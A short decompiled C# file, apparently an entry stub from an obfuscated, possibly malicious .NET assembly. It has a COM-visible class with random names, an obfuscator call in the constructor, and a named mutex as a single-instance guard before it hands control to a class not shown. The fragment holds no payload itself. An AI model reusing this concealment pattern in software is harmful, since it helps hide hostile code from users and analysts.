using System;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace nulvifmubgc;

[ClassInterface(ClassInterfaceType.None)]
[ComVisible(true)]
public class nulvifmubgc
{
	public static Mutex MT;

	public nulvifmubgc()
	{
		Class0.WmbnijfROQyXM();
		base._002Ector();
	}

	public void W(string m)
	{
		try
		{
			MT = new Mutex(initiallyOwned: true, m);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		A a = new A();
		a.NJ = true;
		a.WL();
	}
}
